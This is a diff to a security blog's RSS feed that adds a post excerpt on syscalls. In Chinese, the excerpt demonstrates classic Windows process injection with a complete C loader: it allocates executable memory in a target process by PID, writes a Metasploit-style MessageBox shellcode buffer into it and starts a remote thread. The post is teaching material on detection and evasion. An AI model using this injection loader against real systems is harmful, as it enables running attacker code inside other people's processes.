@@ -6,7 +6,18 @@
     <description>Recent content in Posts on Muxue Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 04 Oct 2021 13:40:53 +0800</lastBuildDate><atom:link href="https://secxue.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 06 Dec 2021 22:14:22 +0800</lastBuildDate><atom:link href="https://secxue.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Syscalls</title>
+      <link>https://secxue.github.io/posts/syscalls/</link>
+      <pubDate>Mon, 06 Dec 2021 22:14:22 +0800</pubDate>
+      
+      <guid>https://secxue.github.io/posts/syscalls/</guid>
+      <description>这个我真的鸽了很久
+区别 传统的进程注入有那些API非常的明显，拿个demo演示
+#include &amp;lt;windows.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc,char* argv[]) { char buf[] = &amp;#34;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&amp;#34; &amp;#34;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&amp;#34; &amp;#34;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&amp;#34; &amp;#34;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&amp;#34; &amp;#34;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&amp;#34; &amp;#34;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&amp;#34; &amp;#34;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&amp;#34; &amp;#34;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&amp;#34; &amp;#34;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&amp;#34; &amp;#34;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&amp;#34; &amp;#34;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&amp;#34; &amp;#34;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&amp;#34; &amp;#34;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&amp;#34; &amp;#34;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&amp;#34; &amp;#34;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&amp;#34; &amp;#34;\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d&amp;#34; &amp;#34;\x85\x0f\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&amp;#34; &amp;#34;\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c&amp;#34; &amp;#34;\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d&amp;#34; &amp;#34;\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00&amp;#34;; int len = sizeof(buf); if (argc != 2) { // 给注入进程的PID  printf(&amp;#34;[!] Usage: %s &amp;lt;pid to inject into&amp;gt;\n&amp;#34;, argv[0]); return EXIT_FAILURE; } auto pid = atoi(argv[1]); // atoi把字符串转换为整数  if (!pid) { // 判断  printf(&amp;#34;[-] Invalid PID: %s\n&amp;#34;, argv[1]); return EXIT_FAILURE; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); LPVOID Address = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // LPVOID: 指向任何类型的指针  //printf(&amp;#34;%d&amp;#34;, len);  WriteProcessMemory(hProcess, Address, buf, len, NULL); CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Address, 0, 0, 0); return 1; } 这种静态分析也很容易就被发现了，用strings和ida分别看下</description>
+    </item>
+    
     <item>
       <title>Simple Shellcode Loader</title>
       <link>https://secxue.github.io/posts/simple-shellcode-loader/</link>
